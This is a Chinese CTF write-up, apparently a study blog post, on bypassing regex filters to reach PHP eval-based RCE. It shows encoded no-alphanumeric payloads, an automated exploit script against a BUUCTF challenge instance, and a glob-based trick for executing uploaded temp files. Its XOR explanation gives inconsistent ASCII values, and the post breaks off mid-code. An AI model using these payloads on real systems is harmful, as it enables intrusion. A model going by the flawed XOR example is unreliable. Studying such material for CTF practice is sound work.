<p><strong>hebrevc()</strong>：将逻辑顺序希伯来文（logical-Hebrew）转换为视觉顺序希伯来文（visual-Hebrew），并且转换换行符，返回视觉顺序字符串。</p>
<h2 id="5-3-数组操作"><a href="#5-3-数组操作" class="headerlink" title="5-3-数组操作"></a>5.3 数组操作</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">end() ： 将内部指针指向数组中的最后一个元素，并输出<br>next() ：将内部指针指向数组中的下一个元素，并输出<br>prev() ：将内部指针指向数组中的上一个元素，并输出<br>reset() ： 将内部指针指向数组中的第一个元素，并输出<br>each() ： 返回当前元素的键名和键值，并将内部指针向前移动<br></code></pre></td></tr></table></figure>
<h2 id="5-4-目录操作"><a href="#5-4-目录操作" class="headerlink" title="5-4-目录操作"></a>5.4 目录操作</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">getchwd() ：函数返回当前工作目录。<br>scandir() ：函数返回指定目录中的文件和目录的数组。<br>dirname() ：函数返回路径中的目录部分。<br>chdir() ：函数改变当前的目录。<br></code></pre></td></tr></table></figure>
<h1>0x06 实战操作</h1>
<h2 id="极客大挑战-2020-Roamphp4-Rceme"><a href="#极客大挑战-2020-Roamphp4-Rceme" class="headerlink" title="极客大挑战-2020-Roamphp4-Rceme"></a>[极客大挑战 2020]Roamphp4-Rceme</h2>
<p>这里在buuctf打开访问</p>
<p class='item-img' data-src='image-20231019202912045.png'><img src="image-20231019202912045.png" alt="image-20231019202912045"></p>
<p>直接先dirsearch扫一波目录，这里扫出一个swp泄露，访问/.index.php.swp访问得到，不过打开文件之后发现乱码，这里用vim还原一下，发现如下代码</p>
<p><code>vim -r index.php.swp</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-comment">//判断是否存在code的session变量，不存在的话随机生成5位md5字符串</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">mt_rand</span>().<span class="hljs-title function_ invoke__">sha1</span>(mt_rand)),<span class="hljs-number">0</span>,<span class="hljs-number">5</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br><br>    <span class="hljs-comment">//判断post传入的code是否与生成的验证码相同</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>]),<span class="hljs-number">0</span>,<span class="hljs-number">5</span>) !== <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;code&#x27;</span>])&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;&lt;script&gt;alert(\&#x27;Captcha error~\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);<br>    &#125;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">mt_rand</span>().<span class="hljs-title function_ invoke__">sha1</span>(mt_rand)),<span class="hljs-number">0</span>,<span class="hljs-number">5</span>);<br>    <span class="hljs-variable">$code</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>    <span class="hljs-comment">//判断code长度以及利用正则匹配限制code传参内容，这里几乎全过滤了，但是没有过滤取反字符，这已经在提示我们了</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$code</span>) &gt; <span class="hljs-number">70</span> <span class="hljs-keyword">or</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[A-Za-z0-9]|\&#x27;|&quot;|`|\ |,|\.|-|\+|=|\/|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|/ixm&#x27;</span>,<span class="hljs-variable">$code</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;&lt;script&gt;alert(\&#x27;Longlone not like you~\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);<br>        <span class="hljs-comment">//这里就是常规的无参RCE题目的正则过滤表达式</span><br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$code</span>))&#123;<br>        @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>我们传入的命令中不能有以下 ，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">/[A-Za-z0-9]|\&#x27;|&quot;|`|\ |,|\.|-|\+|=|\/|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|/，<br></code></pre></td></tr></table></figure>
<p>想到是无字母数字，过滤了 异或 和或，留了取反，同时我们的函数必须是无参的。</p>
<p>这里先上一个md5碰撞绕过验证码的脚本</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> hashlib<br>a=<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入您要爆破的md5:&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">200000000</span>):<br><br>    x=hashlib.md5(<span class="hljs-built_in">str</span>(i).encode(encoding=<span class="hljs-string">&#x27;UTF-8&#x27;</span>)).hexdigest()<br><br>    <span class="hljs-keyword">if</span> (x[<span class="hljs-number">0</span>:<span class="hljs-number">5</span>]==a):<br>        <span class="hljs-built_in">print</span>(x)<br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
<p>我们先用getallheaders函数看一下当前环境变量，当然在输入的时候要进行url编码取反，这里编码推荐bp自带的</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">原型为: var_dump(getallheaders())<br><br>cmd=[~%89%9E%8D%A0%9B%8A%92%8F][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]());<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20231019212815605.png'><img src="image-20231019212815605.png" alt="image-20231019212815605"></p>
<p>很好我们直接尝试修改ua头，因为这里host肯定不能修改，我们可以用next函数使指针指向下一位</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">原型为: system(next(getallheaders()))<br><br>cmd=[~%8C%86%8C%8B%9A%92][!%FF]([~%91%9A%87%8B][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]()));<br></code></pre></td></tr></table></figure>
<p>ua头输入ls /查看flag所在地</p>
<p class='item-img' data-src='image-20231019213556468.png'><img src="image-20231019213556468.png" alt="image-20231019213556468"></p>
<p>找到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">原型为: system(next(getallheaders()))<br><br>cmd=[~%8C%86%8C%8B%9A%92][!%FF]([~%91%9A%87%8B][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]()));<br></code></pre></td></tr></table></figure>
<p>ua头输入cat /flag所在地flll1114gggggg</p>
<p class='item-img' data-src='image-20231019213805874.png'><img src="image-20231019213805874.png" alt="image-20231019213805874"></p>
<p>拿到flag，麻烦的点在于每次bp抓包都要重新爆破一下验证码，不过有个佬写出了exp，可以全自动，如下</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> sys<br><br><br>url = <span class="hljs-string">&#x27;http://01bca480-d4fd-4597-a13a-a9829e724683.node4.buuoj.cn:81/&#x27;</span><br><br>session = requests.session()<br><span class="hljs-comment"># 1 md5 解码</span><br>r = session.get(<br>    url=url,<br>)<br>md5_value = re.findall(<span class="hljs-string">r&#x27;if:substr\(md5\(\$code\),0,5\)==(.+?)&quot;&#x27;</span>, r.text)[<span class="hljs-number">0</span>]<br>code = <span class="hljs-string">&#x27;&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md5</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(s.encode()).hexdigest()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">demd5</span>(<span class="hljs-params">code</span>):<span class="hljs-comment">#爆破md5</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">9999999</span>):<br>        <span class="hljs-keyword">if</span> md5(<span class="hljs-built_in">str</span>(i)).startswith(code):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*]code:&#x27;</span>, i)<br>            code = i<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">return</span> code<br><br>code = demd5(md5_value)<br><br><span class="hljs-comment"># 2 发送payload</span><br>cmd = <span class="hljs-string">&#x27;[~%89%9E%8D%A0%9B%8A%92%8F][~%CF]([~%91%9A%87%8B][~%CF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][~%CF]()));&#x27;</span><br>raw_data = <span class="hljs-string">f&#x27;code=<span class="hljs-subst">&#123;code&#125;</span>&amp;cmd=<span class="hljs-subst">&#123;cmd&#125;</span>&#x27;</span><br>r = session.post(<br>    url=url,<br>    data=raw_data,<br>    allow_redirects=<span class="hljs-literal">False</span>,<br>    headers=&#123;<br>        <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>,<br>        <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;tac /*&#x27;</span>, <span class="hljs-comment"># 执行的代码</span><br>    &#125;<br>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*]&#x27;</span>, r.text)<br><br><span class="hljs-comment"># phpinfo(): [~%8F%97%8F%96%91%99%90][~%CF]();</span><br><br><span class="hljs-comment">#查看shell在第几个：</span><br><span class="hljs-comment"># var_dump(getallheaders())： [~%89%9E%8D%A0%9B%8A%92%8F][~%CF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][~%CF]());</span><br><br><span class="hljs-comment">#返回shell</span><br><span class="hljs-comment"># var_dump(next(getallheaders())): [~%89%9E%8D%A0%9B%8A%92%8F][~%CF]([~%91%9A%87%8B][~%CF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][~%CF]()));</span><br><br><span class="hljs-comment">#执行shell</span><br><span class="hljs-comment"># system(next(getallheaders())): [~%8C%86%8C%8B%9A%92][~%CF]([~%91%9A%87%8B][~%CF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][~%CF]()));</span><br></code></pre></td></tr></table></figure>
<p>这里呢在跟着wp学习一下上述payload的构造原理：</p>
<p>上述payload中采用!%EF的原因在于下列解释</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">php -r <span class="hljs-string">&quot;echo [1,2][0];&quot;</span><br>返回<span class="hljs-number">1</span><br>把他看成一个数组，然后取下标为<span class="hljs-number">0</span>的内容，由于这里不能用()，所以改成了[][<span class="hljs-number">0</span>]，不过<span class="hljs-number">0</span>不过滤了，改成!%FF，%FF为True，加了感叹号变成了False<br><br>测试<br>php -r <span class="hljs-string">&quot;echo [1,2][False];&quot;</span><br>返回<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
<p>这里false代表的是0，true肯定就是代表1</p>
<p>故此<code>[phpinfo][0]=[phpinfo][!%FF]</code>代表的就是phpinfo，而%FF肯定不是0，但在!之下就是0了，而这里用数组去表示原因在于，题目给的第二个正则过滤了括号</p>
<p>这里我又对第一个正则产生了疑问，他不是会检测传入内容是否包含数字字母吗，但我传入的虽然是编码的，但显然有数字，之后测试了一番发现，如果传入类似上述payload（经过url编码的）不论是get还是post传参，都会经过url解码，而最终出现的都是不可见字符，因此完全不会被正则所匹配到。</p>
<p>但至于上述的~%CF或者是~%EF我还是不理解是什么意思，wp给出的解释是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">加这个[~%CF]只是因为php7的解析方式，当然换成其他的也可以例如[~%EF]<br></code></pre></td></tr></table></figure>
<p>我尝试解码发现也是一些特殊字符，不过还是没有理解在此的含义，我感觉还是!%FF好理解，不过这里就先记录吧，希望日后可以有所解惑</p>
<p>好过了几分钟我又来了，多亏我不懈的思考终于有所解惑，这里我一直使用的hackbar进行的传参，发现总是不成功，但如果使用明文字符phpinfo就可以，接着我突然想到用bp试试</p>
<p class='item-img' data-src='image-20231020185935362.png'><img src="image-20231020185935362.png" alt="image-20231020185935362"></p>
<p>如上图，竟然成功了，接着看到刚抓包的时候发现如下图</p>
<p class='item-img' data-src='image-20231020190028402.png'><img src="image-20231020190028402.png" alt="image-20231020190028402"></p>
<p>我们cmd的内容被url编码了，而我们又是post传参，服务器是不会自动去解码的（也就是两次解码）故此我们需要bp传上去，接着我尝试换成get传参（用hackbar）</p>
<p class='item-img' data-src='image-20231020190303241.png'><img src="image-20231020190303241.png" alt="image-20231020190303241"></p>
<p>如上图成功了，这验证了我们之前的想法。nice！！！</p>
<h2 id="无参RCE构造思想："><a href="#无参RCE构造思想：" class="headerlink" title="无参RCE构造思想："></a>无参RCE构造思想：</h2>
<p>p神是根据如下代码进行的思考：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$code</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$code</span>)&gt;<span class="hljs-number">35</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Long.&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[A-Za-z0-9_$]+/&quot;</span>,<span class="hljs-variable">$code</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NO.&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
<h3 id="PHP7下"><a href="#PHP7下" class="headerlink" title="PHP7下"></a>PHP7下</h3>
<p>php7中修改了表达式执行的顺序：<a target="_blank" rel="noopener" href="http://php.net/manual/zh/migration70.incompatible.php">http://php.net/manual/zh/migration70.incompatible.php</a> ：</p>
<p class='item-img' data-src='image-20231019215144978.png'><img src="image-20231019215144978.png" alt="image-20231019215144978"></p>
<p>PHP7前是不允许用<code>($a)();</code>这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过<code>('phpinfo')();</code>来执行函数，第一个括号中可以是任意PHP表达式。</p>
<p>所以很简单了，构造一个可以生成<code>phpinfo</code>这个字符串的PHP表达式即可。payload如下（不可见字符用url编码表示）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">(~%8F%97%8F%96%91%99%90)();<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20231019215318246.png'><img src="image-20231019215318246.png" alt="image-20231019215318246"></p>
<h3 id="PHP5下-p神的顶尖思路（注重p神的思考方式）"><a href="#PHP5下-p神的顶尖思路（注重p神的思考方式）" class="headerlink" title="PHP5下-p神的顶尖思路（注重p神的思考方式）"></a>PHP5下-p神的顶尖思路（注重p神的思考方式）</h3>
<p>好吧，这里我跟着p神是能看懂，但这里就不复现了，我直接不要脸了（bushi借用p神图片</p>
<p>首先p神对PHP5的getshell进行了思考：</p>
<p>我们使用<code>docker run --rm -p 9090:80 -v </code>pwd<code>:/var/www/html php:5.6-apach</code>来运行一个php5.6的web环境。</p>
<p>此时，我们尝试用PHP7的payload，将会得到一个错误：</p>
<p class='item-img' data-src='image-20231019215956586.png'><img src="image-20231019215956586.png" alt="image-20231019215956586"></p>
<p>原因就是php5并不支持这种表达方式。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">p神思考：<br><br>在我在知识星球里发出帖子的时候，其实还没想到如何用PHP5解决问题，但我有自信解决它，所以先发了这个小挑战。后来关上电脑仔细想想，发现当思路禁锢在一个点的时候，你将会钻进牛角尖；当你用大局观来看待问题，问题就迎刃而解。<br><br>当然，我觉得我的方法应该不是唯一的，不过一直没人出来公布答案，我就先抛钻引玉了。<br><br>大部分语言都不会是单纯的逻辑语言，一门全功能的语言必然需要和操作系统进行交互。操作系统里包含的最重要的两个功能就是“shell（系统命令）”和“文件系统”，很多木马与远控其实也只实现了这两个功能。<br><br>PHP自然也能够和操作系统进行交互，“反引号”就是PHP中最简单的执行shell的方法。那么，在使用PHP无法解决问题的情况下，为何不考虑用“反引号”+“shell”的方式来getshell呢？<br></code></pre></td></tr></table></figure>
<p>于是他想到了php+shell打破禁锢</p>
<p>因为反引号不属于“字母”、“数字”，所以我们可以执行系统命令，但问题来了：如何利用无字母、数字、<code>$</code>的系统命令来getshell？</p>
<p>好像问题又回到了原点：无字母、数字、<code>$</code>，在shell中仍然是一个难题。</p>
<p>此时我想到了两个有趣的Linux shell知识点：</p>
<ol>
<li>shell下可以利用<code>.</code>来执行任意脚本</li>
<li>Linux文件名支持用glob通配符代替</li>
</ol>
<p>第一点曾在《 <a target="_blank" rel="noopener" href="https://www.leavesongs.com/SHARE/some-tricks-from-my-secret-group.html">小密圈里的那些奇技淫巧</a> 》露出过一角，但我没细讲。<code>.</code>或者叫period，它的作用和source一样，就是用当前的shell执行一个文件中的命令。比如，当前运行的shell是bash，则<code>. file</code>的意思就是用bash执行file文件中的命令。</p>
<p>用<code>. file</code>执行文件，是不需要file有x权限的。那么，如果目标服务器上有一个我们可控的文件，那不就可以利用<code>.</code>来执行它了吗？</p>
<p>这个文件也很好得到，我们可以发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是<code>/tmp/phpXXXXXX</code>，文件名最后6个字符是随机的大小写字母。</p>
<p>第二个难题接踵而至，执行<code>. /tmp/phpXXXXXX</code>，也是有字母的。此时就可以用到Linux下的glob通配符：</p>
<ul>
<li><code>*</code>可以代替0个及以上任意字符</li>
<li><code>?</code>可以代表1个任意字符</li>
</ul>
<p>那么，<code>/tmp/phpXXXXXX</code>就可以表示为<code>/*/?????????</code>或<code>/???/?????????</code>。</p>
<p>但我们尝试执行<code>. /???/?????????</code>，却得到如下错误：</p>
<p class='item-img' data-src='image-20231019220052718.png'><img src="image-20231019220052718.png" alt="image-20231019220052718"></p>
<p>这是因为，能够匹配上<code>/???/?????????</code>这个通配符的文件有很多，我们可以列出来：</p>
<p class='item-img' data-src='image-20231019220102512.png'><img src="image-20231019220102512.png" alt="image-20231019220102512"></p>
<p>可见，我们要执行的<code>/tmp/phpcjggLC</code>排在倒数第二位。然而，在执行第一个匹配上的文件（即<code>/bin/run-parts</code>）的时候就已经出现了错误，导致整个流程停止，根本不会执行到我们上传的文件。</p>
<p>思路又陷入了僵局，虽然方向没错。</p>
<p>于是p神又开始深入理解glob通配符（翻阅linux文档）</p>
<p>大部分同学对于通配符，可能知道的都只有<code>*</code>和<code>?</code>。但实际上，阅读Linux的文档（ <a target="_blank" rel="noopener" href="http://man7.org/linux/man-pages/man7/glob.7.html">http://man7.org/linux/man-pages/man7/glob.7.html</a> ），可以学到更多有趣的知识点。</p>
<p>其中，glob支持用<code>[^x]</code>的方法来构造“这个位置不是字符x”。那么，我们用这个姿势干掉<code>/bin/run-parts</code>：</p>
<p class='item-img' data-src='image-20231019220148448.png'><img src="image-20231019220148448.png" alt="image-20231019220148448"></p>
<p>排除了第4个字符是<code>-</code>的文件，同样我们可以排除包含<code>.</code>的文件：</p>
<p class='item-img' data-src='image-20231019220158628.png'><img src="image-20231019220158628.png" alt="image-20231019220158628"></p>
<p>现在就剩最后三个文件了。但我们要执行的文件仍然排在最后，但我发现这三个文件名中都不包含特殊字符，那么这个方法似乎行不通了。</p>
<p>继续阅读glob的帮助，我发现另一个有趣的用法：就跟正则表达式类似，glob支持利用<code>[0-9]</code>来表示一个范围。</p>
<p>我们再来看看之前列出可能干扰我们的文件：</p>
<p class='item-img' data-src='image-20231019220217535.png'><img src="image-20231019220217535.png" alt="image-20231019220217535"></p>
<p>所有文件名都是小写，只有PHP生成的临时文件包含大写字母。那么答案就呼之欲出了，我们只要找到一个可以表示“大写字母”的glob通配符，就能精准找到我们要执行的文件。</p>
<p>翻开ascii码表，可见大写字母位于<code>@</code>与<code>[</code>之间：</p>
<p class='item-img' data-src='image-20231019220230330.png'><img src="image-20231019220230330.png" alt="image-20231019220230330"></p>
<p>那么，我们可以利用<code>[@-[]</code>来表示大写字母：</p>
<p class='item-img' data-src='image-20231019220237026.png'><img src="image-20231019220237026.png" alt="image-20231019220237026"></p>
<p>当然，php生成临时文件名是随机的，最后一个字符不一定是大写字母，不过多尝试几次也就行了。</p>
<p>最后，我传入的code为<code>?&gt;&lt;?=</code>. /???/???[@-[]<code>;?&gt;</code>，发送数据包如下：</p>
<p class='item-img' data-src='image-20231019220251334.png'><img src="image-20231019220251334.png" alt="image-20231019220251334"></p>
<p>成功执行任意命令。</p>
<h1>0x07 %FF以及XOR的思考</h1>
<p>这里对于上述payload的构造仍有诸多疑问，故此搜了许多文章在此学习一波。</p>
<h2 id="7-1-PHP异或流程"><a href="#7-1-PHP异或流程" class="headerlink" title="7-1-PHP异或流程"></a>7.1 PHP异或流程</h2>
<p>在PHP中，两个变量的值进行异或时，会先将两个变量的值转换为ASCII，再将ASCII转换为<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E4%BA%8C%E8%BF%9B%E5%88%B6&amp;spm=1001.2101.3001.7020">二进制</a>，对两对二进制数据进行异或，异或完，再将结果转为ASCII，最后将ASCII转为字符串，即为最终结果。</p>
<h2 id="7-2-异或运算法则"><a href="#7-2-异或运算法则" class="headerlink" title="7-2-异或运算法则"></a>7.2 异或运算法则</h2>
<p>0&amp;0=0；1&amp;1=0；0&amp;1=1；1&amp;0=1</p>
<p>两个二进制数相同时，异或为0，不同为1</p>
<p>例：php中的字符串A和字符串?</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;A&quot;</span>^<span class="hljs-string">&quot;?&quot;</span>;<br><span class="hljs-comment">//输出：~</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">(1)</span><br><span class="hljs-comment">A的ASCII值：65</span><br><span class="hljs-comment">?的ASCII值：77</span><br><span class="hljs-comment">(2)</span><br><span class="hljs-comment">65转为二进制：1000001</span><br><span class="hljs-comment">90转为二进制：0111111</span><br><span class="hljs-comment">(3)</span><br><span class="hljs-comment">二进制异或结果：1111110</span><br><span class="hljs-comment">二进制转为ASCII:126</span><br><span class="hljs-comment">ASCII转为字符串：~</span><br><span class="hljs-comment">*/</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>利用异或制作php执行代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 